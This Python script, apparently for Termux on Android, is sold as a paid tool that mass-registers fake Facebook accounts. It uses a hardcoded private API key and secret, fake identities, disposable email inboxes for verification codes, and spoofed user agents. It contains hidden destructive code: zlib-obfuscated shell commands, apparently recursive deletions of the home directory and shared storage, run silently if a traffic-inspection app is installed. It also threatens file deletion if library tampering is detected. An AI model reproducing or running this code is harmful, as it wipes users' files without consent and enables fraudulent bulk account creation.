#──────────────{ IMPORT }──────────────#
import os,sys,re,time,json
import requests,bs4,string
import os
import time
import requests
import logging
import hashlib
from pystyle import Colors, Colorate
import faker,fake_email,random
from faker import Faker
from fake_email import Email
from bs4 import BeautifulSoup
from pystyle import Colors, Colorate
try:
    import rich, requests
except:
    os.system(" pkg install python")
    os.system(" pip install bs4 ")
    os.system(" pip install requests ")
    os.system(" pip3 install psytyle ")
    import rich, requests
from rich import print 
from rich.tree import Tree
from rich.panel import Panel
from rich.columns import Columns
from rich.console import Console
from rich.console import Group
from rich.align import Align
from rich.syntax import Syntax
from datetime import datetime
from time import sleep
from time import sleep as jeda
from time import strftime
from bs4 import BeautifulSoup as sop
from datetime import datetime
from time import sleep as slp
#──────────────{ SECURITY-CODE }──────────────#
def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(Panel('  [bold white]ALL YOUR FILES WILL REMOVE IF YOU TRY AGAIN! | FUCK YOU LOL',subtitle="[bold red]× [bright_yellow]× [green1]×",subtitle_align='left',title="[bold red]× [bright_yellow]× [green1]×",title_align='right',width=102,padding=0,style="bold white"));exit()
        else:exit()
    except:exit()

from requests import api
x = open(api.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'os.system' in x:
    clr()
if 'system' in x:
    clr()
if '(url)' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'ERROR' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import sessions
x = open(sessions.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sdcard' in x:
    clr()
if "60*'='" in x:
    clr()
if "60 * '='" in x:
    clr()
if "'='" in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'open' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'open' in x:
    clr()
if 'echo' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'str(url)' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'l(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'n(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'r(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'DR4X' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import models
x = open(models.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'RPW-Gabx1107GRAY' in x:
    clr()
if 'Gabx' in x:
    clr()
if 'if self.url' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'blob' in x:
    clr()
if '.txt' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'approvalSheet' in x:
    clr()
if 'approval' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'open' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'system' in x:
    clr()
if 'M4786==' in x:
    clr()
if 'M1107==' in x:
    clr()
if 'os.system' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'e(url)' in x:
    clr()
if 'g(url)' in x:
    clr()
if 'h(url)' in x:
    clr()
if 'i(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{data}' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'ERROR' in x:
    clr()
if '{headers}' in x:
    clr()

#──────────────{ UNINSTALL HTTPCANARY }──────────────#
try:
    a = "anar"
    t="tt"
    fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
    if f'com.h{t}pc{a}y.pro' in fileee:
        print(Panel('  [bold white]FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS',subtitle="[bold red]× [bright_yellow]× [green1]×",subtitle_align='left',title="[bold red]× [bright_yellow]× [green1]×",title_align='right',width=102,padding=0,style="bold white"))
        os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
        exit()
        #else:pass
except Exception as e:
    pass
#──────────────{ FILE FOLDER }──────────────#
folder_path = '/sdcard/AUTO-CREATE/create/alive.txt'
try:
    os.makedirs(folder_path, exist_ok=True)
except:
    pass

#──────────────{ WAKTU }──────────────#
bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
waktu = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")

#──────────────{ USERAGENT UA }──────────────#
def ua():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783051;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	ua = a+b
	return ua
def ua1():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629362;FBDM/{density=2.75,width=1080,height=2150};FBLC/en_GB;FBRV/0;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua1 = a+b
	return ua1
def ua2():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681576;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
	ua2 = a+b
	return ua2
def ua3():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/79.0.0.18.71;FBBV/31009794;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/TELCEL;FBMF/TCT;FBBD/TCT;FBPN/com.facebook.katana;FBDV/ALCATEL ONE TOUCH 7042A;FBSV/4.2.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	ua3 = a+b
	return ua3
def ua4():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.5,width=1440,height=2792};FBLC/es_LA;FBRV/0;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
	ua4 = a+b
	return ua4
def ua5():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/270.1.0.66.127;FBBV/214895087;FBDM/{density=1.5,width=1920,height=1128};FBLC/nl_NL;FBRV/215683036;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TAB 2 A10-70F;FBSV/5.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua5 = a+b
	return ua5
def ua6():
	p1 = ua1()
	p2 = ua2()
	p3 = ua3()
	p4 = ua4()
	p5 = ua5()
	ua6 = random.choice([p1,p2,p3,p4,p5])
	return ua6
#──────────────{ RANDOM }──────────────#
def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
#──────────────{ LOCKED CHECKER }──────────────#
def lock_checker(id):
    try:
        req = requests.get(f'https://graph.facebook.com/{id}/picture?type=normal').text
        if 'Photoshop' in req:
            return 'Active'
        else:
            return 'Active'
    except Exception as e:
        print(f'ERROR CHECKING ACCOUNT STATUS : {e}')
        return 'Error'
#──────────────{ OK AT CP }──────────────#
oks = []
cps = []
uid = []
id = []
#──────────────{ USERAGENT UA }──────────────#
from fake_useragent import UserAgent
ua = UserAgent()

def ugenX():
    ualist = [ua.random for _ in range(50)]
    return str(random.choice(ualist))
#──────────────{ FAKE NAME }──────────────#
def fake_name():
    first = Faker("en_PH").first_name()
    last = Faker("en_PH").last_name()
    return first,last
#──────────────{ FAKE PASSWORD }──────────────#
def fake_password():
    name = " ".join(fake_name()).replace(' ', '')
    namepassword = f'{name}{str(random.randrange(1000,10000))}'
    return namepassword
#──────────────{ EXTRACTOR }──────────────#
def extractor(data):
    try:
        soup = BeautifulSoup(data,"html.parser")
        data = {}
        for inputs in soup.find_all("input"):
            name = inputs.get("name")
            value = inputs.get("value")
            if name:
                data[name] = value
        return data
    except Exception as e:
        return {"error":str(e)}
#──────────────{ PHONE NUMBER }──────────────#
def get_nope():
    na = random.choice(['77', '78', '59'])
    ni = str(random.randrange(1000, 10000))
    nu = str(random.randrange(10000, 100000))
    nope = '+639%s%s%s' % (na, ni, nu)
    return nope
#──────────────{ PHONE NUMBER }──────────────#
def get_nopee():
    na = random.choice(['77', '78', '59'])
    ni = str(random.randrange(1000, 10000))
    nu = str(random.randrange(10000, 100000))
    nope = '+880%s%s%s' % (na, ni, nu)
    return nope    
#──────────────{ EMAIL }──────────────#
def GetEmail():
    response = requests.post('https://api.internal.temp-mail.io/api/v3/email/new').json()
    return response['email']
#──────────────{ EMAIL CODE }──────────────#
def GetCode():
    try:
        response = requests.get(f'https://api.internal.temp-mail.io/api/v3/email/{email}/messages').text
        print(response.json())
        code = re.search(r'FB-(\d+)', response).group(1)
        return code
    except:
        return None
#──────────────{ COLOR }──────────────#
m = "\033[0;31m" 
p = "\033[0;37m" 
h = "\033[0;32m" 
b = "\033[34m"
k= "\033[33m"
#──────────────{ SPACE SYSTEM }──────────────#
def space():
    print("\n")
#──────────────{ SPACE IP }──────────────#   
a = requests.get("http://ip-api.com/json/", headers={"Referer": "http://ip-api.com/", "Content-Type": "application/json; charset=utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.0 Chrome/63.0.3239.111 Mobile Safari/537.36"}).json()
xy = requests.get('https://api.ipify.org/').text
co = a["country"] 
os.system('clear')
print('\r\r\r[bold white] YOUR IP:[bold green1]'+str(xy))
print('\r\r\r[bold red] YOUR COUNTRY:[bold green1]'+str(co))
time.sleep(3)
os.system("clear")
#===============[ COLOR ] ==============]
G = '\x1b[1;32m';W = '\x1b[1;97m';R = '\x1b[38;5;160m';B = '\x1b[1;94m';Y = '\x1b[1;33m';T = '\x1b[1;34m';E = '\x1b[38;5;205m';Y = '\x1b[1;93m';Z = '\x1b[38;5;51m';X = '\x1b[38;5;50m';C = '\x1b[38;5;49m';V = '\x1b[38;5;48m'
#===============[ APPROVED ]=============]
def GabxTools():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "×".join(uuid)
  server = requests.get(f'https://github.com/Lumagdazz1/Maxene/blob/main/Approval.txt').text

  os.system(f"clear")
  print("==================================================")
  print( " </> CODED BY ‣ LUMAGDAZZ\n </> VERSION  ‣ V.2\n </> TOOL     ‣ FACEBOOK AUTO CREATION")
  print("==================================================")
  print(f" [=] YOUR CREATION KEY : "+id)
  print("==================================================")
  print(f" [=] BOT CHECKING KEY ")
  try:
    httpCaht = requests.get(f"https://github.com/Lumagdazz1/Maxene/blob/main/Approval.txt").text
    if id in httpCaht:
      print("==================================================")
      print(f" ✔️ SUCCESSFUL KEY ADDED TO TXT FILE ");time.sleep(2)
      os.system("clear")
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      print("==================================================")
      print(f" [=] THIS TOOL IS PAID ")
      print(f" [=] GCASH ONLY PAYMENT METHOD")
      print("==================================================")
      print("==================================================")
      print(f" [=] YOUR KEY NOT APPROVED")
      print(f" [=] SEND KEY FOR ACCESS THIS TOOL")
      print(f" [=] AUTOMATIC DIRECT TO ADMIN IN 15 SECOND"); time.sleep(15)
      print("==================================================")
      os.system(f'xdg-open https://t.me/+639507396570?text=')
      time.sleep(6)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	GabxTools()    
 
GabxTools()
#===============[ LOGO ] ==============]
def Lnx():
    print("==================================================")
#===============[ LOGO ] ==============]

def logo():
    print( "\n LUMAGDAZZ ");Lnx()
    print( " <✅> CODED BY LUMAGDAZZ\n <✅> VERSION  ‣ V10\n <✅> TOOL     ‣  FACEBOOK AUTO CREATE")
#===============[ MAIN ] ==============]
def main():
    logo()
    Lnx()
    print(' [1] AUTO CREATE ')
    print(' [2] CONTACT ADMIN')
    print(' [0] EXIT')
    Lnx()
    op = input(" [>_] Choose : \033[37m").replace("0", "")
    
    while not (op in ["1", "2", "0"]):
        print(" [>_] Wrong Input!")
        op = input(" [>_] Enter Your Choice\033[92m : \033[37m").replace("0", "")
    
    if (op == "1"):
        method()
    elif (op == "2"):
        contact()
    elif (op == "0"):
        sys.exit()
#===============[ METHOD] ==============]
def method():
    os.system("clear")
    logo()
    Lnx()
    print(""" [01] METHOD 1 | DATA / Any Network""")
    Lnx()
    Gabx = Console().input(" [×] Select : ")
    if Gabx in ["a","A","1","01"]:
        menu()
    elif Gabx in ["b","B","2","02"]:
        menu()
#──────────────{ PROGRES }──────────────#
def progres(current, num_accounts, delay):
		for sleep in range(int(num_accounts), 0, -1):
			print(f'[Running]-[{current}|{num_accounts}]-[SUCCESS:-{len(oks)}|BAD:-{len(cps)}]',end='\r')
			time.sleep(1)
			if current == num_accounts:
				break

#──────────────{ AUTO CREATE METHOD 1 }──────────────#
def menu():
    fake = Faker()
    os.system("clear")
    logo()
    Lnx()
    print(' 🤔 How Many Account Do You Want To Create? ')
    Lnx()
    num_accounts = int(input("[📂] : "))
    Lnx()
    print(' ⏳ How Many Delay Register Time To Request Create Again?')
    Lnx()
    delay = int(input("[📂] : "))
    os.system("clear")
    logo()
    Lnx()
    print(""" [green_yellow][[bold cyan1]01[green_yellow]][bold green] DEFAULT PASSWORD\n [green_yellow][[bold cyan1]02[green_yellow]][bold green] CUSTOM PASSWORD    """)
    Lnx()
    Gabxpassword = Console().input(" [√] Select : ")
    Lnx()
    if Gabxpassword in ["a","A","1","01"]:
    	password=fake_password()
    elif Gabxpassword in ["b","B","2","02"]:
        password=input('\033[1;37m[📂] Enter Your Custom Password : ')
    os.system("clear")
    logo()
    Lnx()
    print(""" [green_yellow][[bold cyan1]01[green_yellow]][bold green] DEFAULT NAME\n [green_yellow][[bold cyan1]02[green_yellow]][bold green] CUSTOM NAME    """)
    Lnx()
    Gabxpassword = Console().input(" [√] Select : ")
    Lnx()
    if Gabxpassword in ["a","A","1","01"]:
    	first_name = fake.first_name()
    	last_name = fake.last_name()
    elif Gabxpassword in ["b","B","2","02"]:
    	first_name=input('\033[1;37m[📂] FIRST NAME : ')
    	last_name=input('\033[1;37m[📂] LAST NAME : ')
    os.system("clear")
    logo()
    Lnx()
    print(f" [bold green]IF NO RESULT ON/OFF AIRPLANE MODE")
    Lnx()
    for _ in range(num_accounts):
        progres(_+1, num_accounts, delay)
        print()
        birthday = fake.date_of_birth(minimum_age=18, maximum_age=90)
        register_facebook_account(password, first_name, last_name, birthday)

def register_facebook_account(password, first_name, last_name, birthday):
    session = requests.Session()
    api_key = '882a8490361da98702bf97a021ddc14d'
    secret = '62f8ce9f74b12f84c123cc23437a4a32'
    gender = random.choice(['M', 'F'])
    em = Email().Mail()
    email = em['mail']
    number = get_nope()
    req = {
        'api_key': api_key, 
        'attempt_login': True, 
        'birthday': birthday.strftime('%Y-%m-%d'), 
        'client_country_code': 'US', 
        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod', 
        'fb_api_req_friendly_name': 'registerAccount', 
        'firstname': first_name, 
        'format': 'json',
        'gender': gender, 
        'lastname': last_name, 
        'email': email, 
        'number': number, 
        'locale': 'en_US', 
        'method': 'user.register', 
        'password': password, 
        'reg_instance': generate_random_string(32), 
        'return_multiple_errors': True
    }
    sorted_req = sorted(req.items(), key=lambda x: x[0])
    sig = ''.join(f'{k}={v}' for k, v in sorted_req)
    ensig = hashlib.md5((sig + secret).encode()).hexdigest()
    req['sig'] = ensig
    api_url = 'https://b-api.facebook.com/method/user.register'
    headers = {'User-Agent': ua6()}
    response = requests.post(api_url, data=req, headers=headers)
    reg = response.json()
    id = reg.get('new_user_id')
    token = reg.get('session_info', {}).get('access_token')
    if id:
        check = lock_checker(id)
        if 'Locked' in check:
            cps.append(id)
        else:
            Lnx()
            print(' [bold green]RUNNING ACTIVE WAIT')
            time.sleep(30)
            try:
                cod = Email(em["session"]).inbox()
                code = re.search(r'(\d+)', str(cod['topic'])).group(1)
            except:
                cod = Email(em["session"]).inbox()
                code = re.search(r'(\d+)', str(cod['topic'])).group(1)
            if code:
                a=Tree(":file_folder:",guide_style="bold green_yellow")
                a.add(f"[violet][[yellow2]×[violet]] [bold green]NAME     [cyan2] | [bold green]{first_name} {last_name}")
                a.add("[violet][[yellow2]×[violet]] [bold green]EMAIL    [cyan2] | [bold green]"+email)
                a.add("[violet][[yellow2]×[violet]] [bold green]NUMBER   [cyan2] | [bold green]"+number)
                a.add("[violet][[yellow2]×[violet]] [bold green]LOGIN OTP[cyan2] | [bold green]"+code)
                print(a)
                hx=("[bold green]"+token)
                Gabxa = Panel.fit("[green] LOGIN SUCCESS",style="bold white")
                Gabxb = Panel("[green] "+id, title="[bold green]UID",width=30,padding=0,style="bold white")
                Gabxc = Panel(f"[bold green] {password}", title="[bold green]PASS",width=30,padding=0,style="bold white")
                a=Tree(":file_folder:",guide_style="bold green_yellow")
                a.add(f"[violet][[yellow2]×[violet]] [bold green]SAVE     [cyan2] | [bold green] /sdcard/AUTO-CREATE/create/alive.txt")
                Gabxe = Columns([Gabxa])
                Gabxf = Columns([Gabxb, Gabxc])
                c=Tree(":file_folder:",guide_style="bold green_yellow")
                c.add(Gabxe)
                c.add(Gabxf)
                c.add(Panel(hx,style="bold white"))
                print(c)
                oks.append(id)
                open("/sdcard/alive.txt", "a").write(id+"|"+code+f"|{password}|"+email+"|"+token+"\n")
            else:
                print()
    else:
        open("/sdcard/AUTO-CREATE/create/disabled-cp.txt", "a").write(f"{email}|{id}|Lumagdazz\n")
        cps.append(id)
        
        
if (__name__ == "__main__"):
    main()
    
  